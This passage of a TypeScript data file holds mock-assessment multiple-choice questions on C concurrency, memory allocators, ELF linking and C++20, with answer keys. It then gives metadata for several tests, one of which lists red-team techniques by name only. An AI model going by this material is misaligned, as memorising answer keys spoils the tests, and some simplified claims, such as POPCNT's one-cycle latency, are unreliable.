    explanation: 'Instruction reordering occurs at two distinct layers: (1) Compile-time by the optimizing compiler, and (2) Runtime by modern out-of-order speculative superscalar CPUs. A compiler barrier `asm volatile("" ::: "memory")` informs the compiler not to hoist memory accesses, but weakly ordered CPUs (ARM, POWER) will still reorder reads and writes in hardware unless hardware memory fences (`dmb`, `sfence`, `mfence`) are emitted.',
    shortcutOrInsight: 'Dual Barriers: Compiler barrier (`::: "memory"`) stops compiler reordering; Hardware barrier (`dmb` / `std::memory_order`) stops CPU reordering.',
    difficulty: 'Very Hard'
  },
  {
    id: 'c2-q4',
    testId: 'mock-c-programming-tier2',
    section: 'Lock-Free Synchronization & CAS',
    companyTag: 'Citadel Low-Latency Infrastructure',
    question: 'What is the "ABA Problem" in lock-free concurrent data structures using atomic Compare-And-Swap (CAS), and how is it definitively resolved in C systems programming?',
    options: [
      'A memory address is read as value A, changed to B by another thread, and changed back to A before CAS executes; CAS succeeds falsely thinking nothing changed. It is solved by Tagged Pointers (version numbers paired with pointer in a 128-bit atomic CAS) or Hazard Pointers',
      'The CPU overheating when executing more than three atomic operations per second',
      'A thread deadlocking because atomic variables cannot be freed using `free()`',
      'Pointers pointing to negative memory addresses on 32-bit systems'
    ],
    correctIndex: 0,
    explanation: 'If thread 1 reads top pointer A of a lock-free stack, is preempted, and thread 2 pops A, pops B, and pushes A back on the stack, thread 1 resumes and performs `CAS(&top, A, next)`. CAS succeeds because the address is still A, but internal pointers of A or the stack are now corrupt! Solution: Double-Word CAS (`cmpxchg16b`) holding `(pointer, 64-bit sequence_counter)`.',
    shortcutOrInsight: 'ABA Fix: Version counter + Pointer packing. Double-width CAS ensures both pointer and generation match before swapping.',
    difficulty: 'Very Hard'
  },
  {
    id: 'c2-q5',
    testId: 'mock-c-programming-tier2',
    section: 'Memory Allocator Internals',
    companyTag: 'jemalloc / tcmalloc Development Team',
    question: 'Why do high-throughput multi-threaded memory allocators (like `jemalloc` and `tcmalloc`) implement Thread-Caching and Per-Thread Arenas rather than relying on a single global heap with a mutex lock?',
    options: [
      'To completely eliminate cross-thread lock contention and cache line bouncing on the global allocator lock by allocating small objects from thread-local caches without synchronization',
      'Because the Linux kernel only allows 1 megabyte of memory per operating system thread',
      'Thread caches prevent memory from ever being swapped to virtual disk',
      'To allow memory addresses to be accessed in reverse order'
    ],
    correctIndex: 0,
    explanation: 'A single global allocator mutex (like legacy glibc malloc) causes severe lock contention: hundreds of worker threads spend up to 70% of CPU time waiting in spinlocks to allocate a 32-byte object. Modern allocators allocate small objects from thread-local caches (`tcache`), only acquiring per-arena locks when thread caches must be refilled from global slabs.',
    shortcutOrInsight: 'Scalable Allocation: Thread-local freelists -> Per-CPU/Thread Arenas -> Global Slabs. Zero locks for 95% of small allocations.',
    difficulty: 'Hard'
  },
  {
    id: 'c2-q6',
    testId: 'mock-c-programming-tier2',
    section: 'Virtual Memory & mmap() Internals',
    companyTag: 'PostgreSQL Buffer Manager / SQLite Core',
    question: 'When an application maps a 100 GB database file into its virtual address space using `mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)`, why does memory allocation not immediately fail on a server with only 16 GB of physical RAM?',
    options: [
      'Virtual address space allocation does not allocate physical memory immediately; physical RAM frames are allocated demand-paged on-the-fly by the CPU Memory Management Unit (MMU) triggering minor page faults upon actual access',
      '`mmap` compresses the 100 GB file down to 8 GB using LZO compression in RAM',
      'Linux creates an encrypted swap partition that expands physical RAM dynamically',
      'The operating system ignores the size parameter and only maps the first 16 megabytes'
    ],
    correctIndex: 0,
    explanation: '`mmap` allocates virtual address space in the process page tables, which is virtually unlimited on 64-bit systems (~128 TB virtual address space). No physical RAM is consumed initially. When the program reads a pointer inside that range, the CPU MMU detects the page is not present and triggers a Page Fault. The kernel loads the 4KB page from disk into page cache.',
    shortcutOrInsight: 'Demand Paging: Virtual memory reservations are free; physical RAM is only allocated when memory pages are touched.',
    difficulty: 'Hard'
  },
  {
    id: 'c2-q7',
    testId: 'mock-c-programming-tier2',
    section: 'Signals & Reentrancy',
    companyTag: 'POSIX Standards Committee',
    question: 'Why is it strictly forbidden to invoke `printf()` or `malloc()` inside an asynchronous POSIX signal handler (`sigaction`)?',
    options: [
      '`printf()` and `malloc()` use internal global locks and static buffers; if a signal interrupts a thread that is already holding that lock, re-entering the function in the signal handler causes an instant permanent deadlock',
      'POSIX signals cannot execute code written in C',
      'Signal handlers are only allowed to execute assembly instructions smaller than 2 bytes',
      '`malloc` causes the CPU to reboot if called inside an interrupt'
    ],
    correctIndex: 0,
    explanation: 'Signal handlers interrupt normal thread execution asynchronously. If a thread is midway through `malloc()` holding the heap mutex and a signal arrives whose handler also calls `malloc()`, the handler attempts to acquire the same non-recursive mutex, resulting in a self-deadlock! POSIX defines a strict list of "Async-Signal-Safe" functions (e.g. `write()`, `_exit()`).',
    shortcutOrInsight: 'Async-Signal Safety: Signal handlers must only access `volatile sig_atomic_t` flags or invoke reentrant POSIX syscalls (`write`, `read`).',
    difficulty: 'Hard'
  },
  {
    id: 'c2-q8',
    testId: 'mock-c-programming-tier2',
    section: 'Dynamic Linking & ELF Binaries',
    companyTag: 'GNU Binutils / glibc Dynamic Linker Team',
    question: 'In ELF dynamic linking, how does Position Independent Code (PIC) resolve external library function calls via the Global Offset Table (GOT) and Procedure Linkage Table (PLT)?',
    options: [
      'The code jumps to a PLT stub; the first call invokes the dynamic linker to resolve the symbol address, writes it into the writable GOT entry, and subsequent calls jump directly to the resolved address via the GOT without invoking the linker again (Lazy Binding)',
      'The compiler rewrites the binary machine code on disk every time the program launches',
      'All external libraries are copied into the binary executable at compile time',
      'The PLT decrypts function addresses using an MD5 hash of the library name'
    ],
    correctIndex: 0,
    explanation: 'PIC allows code segments to be loaded at any virtual address across processes while remaining read-only (sharable text segment). Dynamic function calls jump to a PLT stub. The PLT reads the function pointer from the data segment\'s GOT. On first call, the GOT points back to the PLT resolver, which invokes `ld.so`. `ld.so` patches the GOT with the actual function address for zero-overhead subsequent calls.',
    shortcutOrInsight: 'Lazy Binding PLT/GOT: Read-only Code -> PLT Stub -> Writable GOT Slot. Patched once on first invocation.',
    difficulty: 'Very Hard'
  },
  {
    id: 'c2-q9',
    testId: 'mock-c-programming-tier2',
    section: 'Bit Manipulation & CPU Intrinsics',
    companyTag: 'NVIDIA CUDA / High-Performance C',
    question: 'Which single hardware instruction and GCC compiler builtin calculates the number of set bits (1s) in a 64-bit integer, and what is its asymptotic execution latency on modern x86_64 CPUs?',
    options: [
      '`__builtin_popcountll(x)` compiling to the hardware `POPCNT` instruction executing in 1 clock cycle latency',
      '`__builtin_clz(x)` executing in 100 clock cycles',
      '`__builtin_bswap64(x)` executing in O(N) linear time',
      'A loop shifting bits right 64 times requiring 64 CPU cycles'
    ],
    correctIndex: 0,
    explanation: 'Modern x86_64 CPUs include hardware bit-manipulation extensions (SSE4.2/BMI). GCC/Clang provide `__builtin_popcountll(x)` which compiles directly to the `POPCNT` machine instruction, calculating population count (Hamming weight) across all 64 bits in a single CPU clock cycle.',
    shortcutOrInsight: 'Bit Intrinsics: `POPCNT` counts set bits in 1 cycle; `__builtin_ctz` counts trailing zeros; `__builtin_clz` counts leading zeros.',
    difficulty: 'Medium'
  },
  {
    id: 'c2-q10',
    testId: 'mock-c-programming-tier2',
    section: 'Undefined Behavior & Compiler Optimization',
    companyTag: 'LLVM Clang Optimization Group',
    question: 'Why does modern GCC/Clang with `-O3` optimize the check `if (ptr + 1 < ptr)` into `if (0)` (dead code elimination) even on 32-bit systems where pointer overflow might wrap around?',
    options: [
      'In C standard ISO/IEC 9899, pointer arithmetic overflow and signed integer overflow are strictly Undefined Behavior (UB); the compiler assumes UB never occurs and optimizes away the check as mathematically impossible',
      'Because all pointers are automatically unsigned 128-bit integers',
      'Because GCC does not support the `<` comparison operator for pointer types',
      'Because memory addresses on Linux can never exceed 1 gigabyte'
    ],
    correctIndex: 0,
    explanation: 'The C standard dictates that pointer arithmetic is only defined within the bounds of an allocated object and one element past. Pointer overflow invokes Undefined Behavior (UB). Since compilers assume UB never happens in well-formed programs, `ptr + 1 < ptr` is treated as a logical contradiction and eliminated as dead code! To test buffer limits safely, use `uintptr_t max_bytes - (uintptr_t)ptr < 1`.',
    shortcutOrInsight: 'Compiler UB Optimization: Compilers assume Undefined Behavior is impossible; never attempt overflow checks using expressions that rely on overflow.',
    difficulty: 'Very Hard'
  }
];

// ============================================================================
// 7. MODERN C++20 & LOW-LATENCY SYSTEMS ENGINEERING (TIER-2) (10 MCQs)
// Concepts, Coroutines, std::memory_order, Lock-Free Queues & SIMD Intrinsics
// ============================================================================
export const CPP_TIER2_QUESTIONS: FaangQuestion[] = [
  {
    id: 'cpp2-q1',
    testId: 'mock-cpp-programming-tier2',
    section: 'Modern C++20 Concepts',
    companyTag: 'Bloomberg / Jane Street Quantitative Dev',
    question: 'How do C++20 "Concepts" (e.g. `template <std::integral T>`) fundamentally improve upon legacy SFINAE and `std::enable_if` in template metaprogramming?',
    options: [
      'They provide first-class compile-time predicate constraints that validate template arguments directly in the function signature, yielding readable compiler errors and short-circuit evaluation without cryptic template instantiation stack traces',
      'They convert template code into runtime virtual function calls',
      'They allow C++ to compile without a C++ compiler',
      'They force all templates to run on GPU cores'
    ],
    correctIndex: 0,
    explanation: 'Legacy SFINAE (`std::enable_if_t<std::is_integral_v<T>>`) abused substitution failures, producing hundreds of lines of impenetrable compiler errors when constraints were violated. C++20 Concepts are first-class language constructs: `requires std::integral<T>`. When violated, compilers output clear diagnostics: "error: constraints not satisfied for class Matrix<T> because \'double\' does not satisfy \'integral\'".',
    shortcutOrInsight: 'C++20 Concepts: Direct constraints replacing SFINAE boilerplate. Readable errors + compile-time overloading.',
    difficulty: 'Hard'
  },
  {
    id: 'cpp2-q2',
    testId: 'mock-cpp-programming-tier2',
    section: 'C++20 Coroutines Architecture',
    companyTag: 'Microsoft DirectX / Unreal Engine Core',
    question: 'In C++20 stackless coroutines, what occurs when a coroutine encounters a `co_await promise;` expression?',
    options: [
      'The current execution state (local variables, instruction pointer) is preserved in a heap-allocated coroutine frame; execution control is yielded back to the caller or scheduler without blocking the OS thread',
      'The operating system kernel creates a new pthread immediately',
      'The CPU executes an interrupt that stops all other processes',
      'The coroutine terminates and frees all memory'
    ],
    correctIndex: 0,
    explanation: 'Unlike fibers (stackful coroutines), C++20 coroutines are stackless: the compiler splits the function into a state machine. When `co_await` suspends, local variables are saved in a heap-allocated (or elided) coroutine frame (`std::coroutine_handle`). Control returns immediately to the caller. When resumed via `handle.resume()`, it jumps directly to the resume point on any thread.',
    shortcutOrInsight: 'Stackless Coroutines: State machine compiler transformation. Suspends without blocking OS kernel threads.',
    difficulty: 'Very Hard'
  },
  {
    id: 'cpp2-q3',
    testId: 'mock-cpp-programming-tier2',
    section: 'C++ Memory Model & Atomics',
    companyTag: 'Jump Trading / Optiver High-Frequency Trading',
    question: 'In low-latency lock-free programming, why is `std::memory_order_seq_cst` avoided in hot paths, and how does `acquire-release` semantics (`std::memory_order_acquire` / `release`) optimize performance?',
    options: [
      '`seq_cst` enforces a globally synchronized total modification order across all CPU cores requiring expensive CPU bus locking and full memory fences; acquire-release synchronizes only between the releasing write and the acquiring read, maximizing hardware instruction pipeline throughput',
      '`seq_cst` deletes variables after 5 milliseconds',
      'Acquire-release only works on single-threaded programs',
      '`seq_cst` is only compatible with Intel 8086 processors'
    ],
    correctIndex: 0,
    explanation: 'Sequential Consistency (`seq_cst`) requires all CPU cores to observe all atomic modifications in the exact same order, which inserts expensive hardware memory barriers (e.g. `MFENCE` on x86, `DMB ISH` on ARM). Acquire-Release semantics creates a one-way synchronization barrier: writes before `release` in thread A cannot be reordered after it, and reads after `acquire` in thread B cannot be reordered before it, avoiding global bus locks.',
    shortcutOrInsight: 'Acquire-Release Pair: Thread A stores with `memory_order_release`; Thread B loads with `memory_order_acquire`. Synchronizes data without global sequential consistency penalties.',
    difficulty: 'Very Hard'
  },
  {
    id: 'cpp2-q4',
    testId: 'mock-cpp-programming-tier2',
    section: 'SIMD Vectorization & AVX-512',
    companyTag: 'Two Sigma / Citadel Quant Trading',
    question: 'When optimizing matrix multiplication in C++ using Intel AVX-512 intrinsics, how many 32-bit single-precision floating-point numbers can a single `__m512` register process in a single FMA (Fused Multiply-Add) instruction?',
    options: [
      '16 floats (512 bits / 32 bits per float = 16 simultaneous operations)',
      '4 floats',
      '8 floats',
      '64 floats'
    ],
    correctIndex: 0,
    explanation: 'An AVX-512 register (`ZMM0` through `ZMM31`) is 512 bits wide. A single-precision `float` is 32 bits. Therefore, 512 / 32 = 16 parallel float operations per instruction. A Fused Multiply-Add instruction (`_mm512_fmadd_ps`) performs 16 multiplications and 16 additions (32 FLOPs) in a single clock cycle.',
    shortcutOrInsight: 'SIMD Widths: SSE = 128-bit (4 floats); AVX2 = 256-bit (8 floats); AVX-512 = 512-bit (16 floats).',
    difficulty: 'Medium'
  },
  {
    id: 'cpp2-q5',
    testId: 'mock-cpp-programming-tier2',
    section: 'Compile-Time Polymorphism & CRTP',
    companyTag: 'NVIDIA Omniverse Engine Core',
    question: 'What is the primary architectural advantage of the Curiously Recurring Template Pattern (CRTP) over traditional virtual function polymorphism in performance-critical C++ libraries?',
    options: [
      'CRTP achieves static compile-time polymorphism without vtables or vptr indirection, enabling aggressive compiler function inlining and zero runtime dynamic dispatch overhead',
      'CRTP allows classes to inherit from multiple parent classes without using public inheritance',
      'CRTP eliminates the need for constructors and destructors',
      'CRTP forces all objects to be allocated in thread-local storage'
    ],
    correctIndex: 0,
    explanation: 'In CRTP: `class Derived : public Base<Derived>`, the base class accesses derived methods via `static_cast<Derived*>(this)->implementation()`. Because types are resolved at compile time, there is no vtable pointer, no cache-miss indirection, and the compiler can completely inline small methods into calling loops.',
    shortcutOrInsight: 'CRTP: Compile-time polymorphism. Zero vtable overhead, full compiler inlining.',
    difficulty: 'Hard'
  },
  {
    id: 'cpp2-q6',
    testId: 'mock-cpp-programming-tier2',
    section: 'Type Safety & Modern Variants',
    companyTag: 'Google Chrome Core Engine',
    question: 'Why is `std::variant` paired with `std::visit` and the overloaded lambda pattern strictly preferred over C-style `union` and `void*` casts in modern C++?',
    options: [
      '`std::variant` is a type-safe tagged union that tracks the currently active type, prevents reading uninitialized memory, and guarantees proper object construction and destruction without undefined behavior',
      '`std::variant` automatically converts integers to strings during compilation',
      '`std::variant` uses 50% less memory than raw C unions',
      'C unions cannot store primitive integer types'
    ],
    correctIndex: 0,
    explanation: 'C-style unions have no mechanism to track which member is active; reading member B after writing member A invokes Undefined Behavior (type punning). `std::variant` stores a discriminator index. Accessing the wrong type via `std::get<T>` throws `std::bad_variant_access`, and assigning new types properly executes destructors and constructors.',
    shortcutOrInsight: 'Safe Discriminated Union: `std::variant` + `std::visit` provides mathematically sound pattern matching with guaranteed destructor execution.',
    difficulty: 'Medium'
  },
  {
    id: 'cpp2-q7',
    testId: 'mock-cpp-programming-tier2',
    section: 'Universal References & Perfect Forwarding',
    companyTag: 'Apple Systems Engineering OA',
    question: 'In the following template function, what is the exact purpose of `std::forward<T>(arg)`?\n```cpp\ntemplate <typename T>\nvoid wrapper(T&& arg) {\n    target(std::forward<T>(arg));\n}\n```',
    options: [
      'It preserves the value category (lvalue vs rvalue) of the original argument: if an lvalue was passed, it forwards as an lvalue; if an rvalue was passed, it casts to an rvalue reference to enable move semantics',
      'It copies the argument to the heap to prevent stack corruption',
      'It casts the argument to a const reference unconditionally',
      'It executes the target function on a background worker thread'
    ],
    correctIndex: 0,
    explanation: 'In `template <typename T> void wrapper(T&& arg)`, `T&&` is a Universal (Forwarding) Reference. Inside the function body, the named parameter `arg` is ALWAYS an lvalue (because it has an identifier/name). Without `std::forward`, passing an rvalue temporary would trigger copy semantics in `target(arg)`. `std::forward<T>` restores the original value category via reference collapsing.',
    shortcutOrInsight: 'Perfect Forwarding: `std::forward<T>(x)` preserves lvalue vs rvalue. Contrast with `std::move(x)` which unconditionally casts to rvalue.',
    difficulty: 'Hard'
  },
  {
    id: 'cpp2-q8',
    testId: 'mock-cpp-programming-tier2',
    section: 'Lock-Free Data Structures',
    companyTag: 'DRW Low-Latency Architecture',
    question: 'In a Single-Producer Single-Consumer (SPSC) lock-free bounded ring buffer, why is no atomic CAS (Compare-And-Swap) needed to achieve thread safety?',
    options: [
      'Only the producer thread modifies the write index, and only the consumer thread modifies the read index; single atomic loads and stores with acquire-release memory ordering on head and tail pointers are sufficient',
      'Because ring buffers can only hold a single element at any time',
      'The CPU automatically pauses the consumer thread when the producer writes',
      'Because C++ ring buffers use mutex locks under the hood'
    ],
    correctIndex: 0,
    explanation: 'In SPSC queues, there is no contention between multiple producers or multiple consumers. The producer only updates `tail_` and reads `head_`. The consumer only updates `head_` and reads `tail_`. By declaring `tail_` and `head_` as `std::atomic<size_t>` with `memory_order_release` on writes and `memory_order_acquire` on reads, synchronization is guaranteed with zero expensive CAS loops.',
    shortcutOrInsight: 'SPSC Efficiency: Pure acquire/release atomic load/store without CAS loops. Achieves sub-10 nanosecond transfer latencies.',
    difficulty: 'Very Hard'
  },
  {
    id: 'cpp2-q9',
    testId: 'mock-cpp-programming-tier2',
    section: 'Zero-Copy String Views',
    companyTag: 'Meta Folly C++ Library Team',
    question: 'What dangerous lifetime hazard must software engineers prevent when using `std::string_view` as function return types or container keys?',
    options: [
      '`std::string_view` is a non-owning pointer-and-length reference; if the underlying `std::string` or character array is destroyed or mutated, the `string_view` becomes a dangling pointer, leading to undefined behavior upon access',
      '`std::string_view` leaks heap memory if not manually freed with `delete`',
      '`std::string_view` cannot be used in functions with more than two arguments',
      '`std::string_view` automatically converts all characters to lowercase'
    ],
    correctIndex: 0,
    explanation: '`std::string_view` consists of `(const char* data, size_t length)`. It never owns or copies memory. If a function creates a temporary `std::string s = "hello"; return std::string_view(s);`, `s` is destroyed at the closing brace, returning a dangling pointer. `string_view` is designed for function parameters, not persistent storage of temporary strings.',
    shortcutOrInsight: 'String View Rule: Outstanding for read-only parameters; hazardous as return types or stored class members unless pointing to static literals.',
    difficulty: 'Medium'
  },
  {
    id: 'cpp2-q10',
    testId: 'mock-cpp-programming-tier2',
    section: 'Hardware Cache Architecture & False Sharing',
    companyTag: 'NVIDIA GPU Systems / Intel Software Optimization',
    question: 'What is "False Sharing" in multi-threaded C++ applications, and which C++17 alignas attribute eliminates it between adjacent thread-counter variables?',
    options: [
      'Two threads on different CPU cores modify independent variables that reside on the same 64-byte hardware cache line, causing cache invalidation storms across cores; solved using `alignas(std::hardware_destructive_interference_size)`',
      'Threads writing to the same hard disk sector simultaneously',
      'The operating system lying about the number of available CPU cores',
      'Variables having the same name in different functions'
    ],
    correctIndex: 0,
    explanation: 'CPUs manage cache in 64-byte chunks (cache lines). If thread 1 updates `struct Foo { int a; int b; }` modifying `a`, and thread 2 modifies `b`, their CPU L1/L2 caches constantly invalidate each other\'s cache lines (cache bouncing) over the MESI coherence bus. Adding `alignas(std::hardware_destructive_interference_size)` pads variables onto distinct 64-byte cache lines.',
    shortcutOrInsight: 'False Sharing Fix: Pad independent concurrent variables to 64 bytes (`hardware_destructive_interference_size`) to avoid cache invalidation storms.',
    difficulty: 'Very Hard'
  }
];

// ============================================================================
// COMBINED TIER-2 MOCK TESTS PART 1 (7 TESTS)
// ============================================================================
export const TIER2_MOCK_TESTS_PART1: FaangMockTest[] = [
  {
    id: 'mock-dbms-sql-tier2',
    title: 'Distributed SQL & Storage Engine Architecture (Tier-2 Assessment)',
    subtitle: '10 High-Yield Technical MCQs • 20 Minutes • Distributed 2PC, LSM Trees, Grace Hash Joins & Spanner Consensus',
    category: 'ENTERPRISE DOMAINS',
    companyTier: 'Tier-1 Database Infrastructure & Distributed Systems',
    companies: ['Google Spanner', 'CockroachDB', 'Snowflake', 'RocksDB Core'],
    scheduledDate: 'Tier-2 Assessment • Deep Systems Crucible (Distributed SQL)',
    durationMinutes: 20,
    totalQuestions: 10,
    marksPerQuestion: 4,
    negativeMark: 1,
    passingPercentage: 60,
    badgeRewardId: 'dbms-distributed-architect',
    badgeRewardName: 'Distributed SQL Engine Architect',
    badgeIcon: '🗄️',
    badgeGradient: 'from-blue-700 via-indigo-900 to-slate-950',
    certificateTitle: 'Official Distributed SQL & Database Engine Architecture Credential',
    description: 'An advanced architectural crucible probing Two-Phase Commit with Paxos consensus, LSM-Tree compaction mechanics, Grace Hash Joins, PACELC Aurora trade-offs, PostgreSQL MVCC XID wraparound, Consistent Hashing with vnodes, and Raft append-only invariants.',
    syllabusHighlights: [
      'Distributed 2PC & Non-Blocking Paxos/Raft Integration',
      'LSM-Tree MemTable, Immutable SSTables & Leveled Compaction',
      'Grace Hash Join vs Index Nested Loop Join Cost Equivalence',
      'PACELC Theorem: Amazon Aurora 4-of-6 Quorum Analysis',
      'PostgreSQL Autovacuum Freeze & 32-bit XID Wraparound Disasters',
      'Consistent Hashing with Virtual Nodes (Vnodes) Dispersion',
      'Inverted Index Postings List Intersections & Skip Pointers',
      'Multi-Granularity Intent Locking (IS/IX) & Hierarchical Latches'
    ],
    questions: DBMS_TIER2_QUESTIONS
  },
  {
    id: 'mock-excel-analytics-tier2',
    title: 'Excel Financial Engineering & Advanced M-Code (Tier-2 Assessment)',
    subtitle: '10 High-Yield Technical MCQs • 20 Minutes • Monte Carlo, M-Code Table.Buffer, Recursive Lambdas & Matrix Math',
    category: 'ENTERPRISE DOMAINS',
    companyTier: 'Tier-1 Investment Banking & Quant Modeling',
    companies: ['Goldman Sachs', 'McKinsey & Co', 'Citadel', 'Morgan Stanley'],
    scheduledDate: 'Tier-2 Assessment • Deep Systems Crucible (Financial Engineering)',
    durationMinutes: 20,
    totalQuestions: 10,
    marksPerQuestion: 4,
    negativeMark: 1,
    passingPercentage: 60,
    badgeRewardId: 'excel-financial-engineer',
    badgeRewardName: 'Excel Quantitative Financial Engineer',
    badgeIcon: '📊',
    badgeGradient: 'from-emerald-700 via-teal-900 to-slate-950',
    certificateTitle: 'Official Excel Financial Engineering & Analytics Credential',
    description: 'An elite financial modeling and calculation engine examination testing Monte Carlo stochastic simulations, Power Query M-Code memory buffering, recursive LAMBDA algorithms, WRAPROWS array shaping, non-periodic XNPV/XIRR discounting, matrix MMULT portfolio variance, native RegEx, and Simplex LP optimization.',
    syllabusHighlights: [
      'Monte Carlo Gaussian Shock Simulation via NORM.INV(RAND())',
      'Power Query M-Code: Table.Buffer() Caching vs Query Folding',
      'Turing-Complete Recursive LAMBDA Functions in Name Manager',
      'Dynamic Array Reshaping with WRAPROWS and WRAPCOLS',
      'Non-Periodic Cash Flow Valuation: XNPV & XIRR Day-Count Fractions',
      'Portfolio Variance Quadratic Forms: Nested MMULT with Covariance',
      'Two-Variable Data Table Upper-Left Dependency Binding',
      'Native Regex Functions: REGEXTEST, REGEXEXTRACT & REGEXREPLACE'
    ],
    questions: EXCEL_TIER2_QUESTIONS
  },
  {
    id: 'mock-powerbi-dax-tier2',
    title: 'Power BI Enterprise Semantic Architecture (Tier-2 Assessment)',
    subtitle: '10 High-Yield Technical MCQs • 20 Minutes • Calculation Groups, DirectQuery Dual Mode, VertiPaq Profiling & TREATAS',
    category: 'ENTERPRISE DOMAINS',
    companyTier: 'Tier-1 Enterprise Analytics & Cloud BI Platforms',
    companies: ['Microsoft Power BI', 'Amazon BI', 'Snowflake', 'Cisco Data'],
    scheduledDate: 'Tier-2 Assessment • Deep Systems Crucible (Enterprise BI)',
    durationMinutes: 20,
    totalQuestions: 10,
    marksPerQuestion: 4,
    negativeMark: 1,
    passingPercentage: 60,
    badgeRewardId: 'powerbi-tabular-architect',
    badgeRewardName: 'Power BI Enterprise Semantic Architect',
    badgeIcon: '📈',
    badgeGradient: 'from-amber-600 via-yellow-800 to-slate-950',
    certificateTitle: 'Official Power BI Enterprise Semantic & DAX Architecture Credential',
    description: 'An architect-level Tabular model crucible testing Calculation Groups with SELECTEDMEASURE(), Composite Model Dual Storage Mode, User-Defined Aggregations, DAX VAR lazy caching, ALL vs ALLSELECTED shadow filter context, VertiPaq Formula Engine vs Storage Engine bottlenecks, and TREATAS virtual relationships.',
    syllabusHighlights: [
      'Calculation Groups: Eliminating Measure Explosion with SELECTEDMEASURE()',
      'Composite Models: Dual Storage Mode Query Pushdown Mechanics',
      'User-Defined Aggregation Tables: In-Memory VertiPaq Agg Hits',
      'DAX VAR Constant Evaluation Invariant in Definition Context',
      'ALL() vs ALLSELECTED(): Visual Slicer Restorations',
      'Non-Standard 4-4-5 Retail Fiscal Calendars in Dedicated DimDate',
      'DAX Studio Profiling: Formula Engine (FE) vs Storage Engine (SE)',
      'TREATAS Virtual Filter Passing into VertiPaq Storage Engine'
    ],
    questions: POWERBI_TIER2_QUESTIONS
  },
  {
    id: 'mock-ethical-hacking-tier2',
    title: 'Advanced Red Teaming & Cloud Infrastructure Exploitation (Tier-2 Assessment)',
    subtitle: '10 High-Yield Technical MCQs • 20 Minutes • Kerberoasting, AS-REP Roasting, Container Escapes & Living off the Land',
    category: 'ENTERPRISE DOMAINS',
    companyTier: 'Tier-1 Offensive Security & Red Team Consultancies',
    companies: ['CrowdStrike', 'Mandiant', 'Palo Alto Unit 42', 'Google Project Zero'],
    scheduledDate: 'Tier-2 Assessment • Deep Systems Crucible (Offensive Security)',
    durationMinutes: 20,
    totalQuestions: 10,
    marksPerQuestion: 4,
    negativeMark: 1,
    passingPercentage: 60,
    badgeRewardId: 'red-team-cloud-operator',
    badgeRewardName: 'Advanced Red Team & Cloud Exploitation Operator',
    badgeIcon: '⚔️',
    badgeGradient: 'from-rose-800 via-red-950 to-slate-950',
    certificateTitle: 'Official Advanced Red Teaming & Cloud Exploitation Credential',
    description: 'A deep offensive security assessment probing Kerberoasting TGS ticket extraction, AS-REP Roasting on DONT_REQ_PREAUTH accounts, Docker container breakout via cgroups release_agent, CI/CD workflow injection, Responder LLMNR/NBT-NS spoofing, LOLBins evasion, DNS Rebinding SSRF, and ROP chain DEP bypasses.',
    syllabusHighlights: [
      'Active Directory Kerberoasting: SPN TGS Extraction & GPU Cracking',
      'AS-REP Roasting: Pre-Authentication Bypass on Targeted Accounts',
      'Docker Privileged Container Breakouts: cgroups release_agent',
      'GitHub Actions CI/CD Pipeline Workflow Injections',
      'LLMNR/NBT-NS Poisoning via Responder & NetNTLMv2 Capture',
      'Living off the Land: LOLBins (certutil, mshta, bitsadmin)',
      'DNS Rebinding TOCTOU Exploitation on Internal IP Ranges',
      'Return-Oriented Programming (ROP) Bypassing DEP / W+X'
    ],
    questions: HACKING_TIER2_QUESTIONS
  },
  {
    id: 'mock-cyber-security-tier2',
    title: 'Enterprise SOC Engineering & Threat Hunting Crucible (Tier-2 Assessment)',
    subtitle: '10 High-Yield Technical MCQs • 20 Minutes • Sigma Rules, Memory Forensics (RWX), Post-Quantum Kyber & mTLS',
    category: 'ENTERPRISE DOMAINS',
    companyTier: 'Enterprise Defense & Cyber Warfare Architecture',
    companies: ['Microsoft Sentinel', 'Cloudflare', 'Splunk', 'AWS Security'],
    scheduledDate: 'Tier-2 Assessment • Deep Systems Crucible (Cyber Defense)',
    durationMinutes: 20,
    totalQuestions: 10,
    marksPerQuestion: 4,
    negativeMark: 1,
    passingPercentage: 60,
    badgeRewardId: 'soc-defense-architect',
    badgeRewardName: 'Enterprise Threat Hunter & SOC Defense Architect',
    badgeIcon: '🛡️',
    badgeGradient: 'from-cyan-700 via-blue-950 to-slate-950',
    certificateTitle: 'Official Enterprise SOC Engineering & Threat Hunting Credential',
    description: 'A high-bar defensive cyber engineering assessment covering vendor-neutral Sigma detection rules, Volatility 3 unbacked RWX memory forensics, Post-Quantum ML-KEM (Kyber) cryptography, mTLS bidirectional certificate handshakes, EDR ntdll unhooking and direct syscalls, DMARC identifier alignment, and BGP RPKI ROA route validation.',
    syllabusHighlights: [
      'Sigma Detection Language: Generic YAML Rule Compilations',
      'Volatility 3 Memory Forensics: windows.malfind & Unbacked RWX Pages',
      'Post-Quantum Cryptography: Shor\'s Algorithm & NIST ML-KEM (Kyber)',
      'Mutual TLS (mTLS) Zero-Trust Microservice Authentication',
      'EDR User-Mode Hooking Bypasses: Direct Syscalls & Disk Remapping',
      'DMARC Identifier Alignment: Strict RFC 5322 From: Domain Binding',
      'Threat Hunting Kerberoasting: Event ID 4769 RC4 (0x17) Signatures',
      'BGP Hijack Mitigation: RPKI Route Origin Authorizations (ROAs)'
    ],
    questions: CYBER_TIER2_QUESTIONS
  },
  {
    id: 'mock-c-programming-tier2',
    title: 'Linux Kernel Internals & Low-Level Concurrency (Tier-2 Assessment)',
    subtitle: '10 High-Yield Technical MCQs • 20 Minutes • epoll ET, io_uring Ring Buffers, ARM Memory Barriers & Tagged CAS',
    category: 'TECHNICAL CORE',
    companyTier: 'Tier-1 Systems Architecture & Operating Systems',
    companies: ['Qualcomm', 'NVIDIA', 'Nginx Core', 'Meta Systems'],
    scheduledDate: 'Tier-2 Assessment • Deep Systems Crucible (C Systems)',
    durationMinutes: 20,
    totalQuestions: 10,
    marksPerQuestion: 4,
    negativeMark: 1,
    passingPercentage: 60,
    badgeRewardId: 'c-kernel-internals-master',
    badgeRewardName: 'C Linux Kernel & Systems Internals Master',
    badgeIcon: '💻',
    badgeGradient: 'from-slate-700 via-slate-900 to-black',
    certificateTitle: 'Official C Systems & Linux Kernel Engineering Credential',
    description: 'A relentless low-level systems assessment testing epoll Edge-Triggered EAGAIN loops, io_uring SQ/CQ shared memory queues, ARM64 hardware memory barriers vs compiler barriers, ABA resolution with Tagged Pointers, jemalloc thread-local arenas, demand-paged mmap() virtual allocations, POSIX async-signal-safety, and compiler undefined behavior optimizations.',
    syllabusHighlights: [
      'epoll Edge-Triggered (EPOLLET) vs Level-Triggered Invariants',
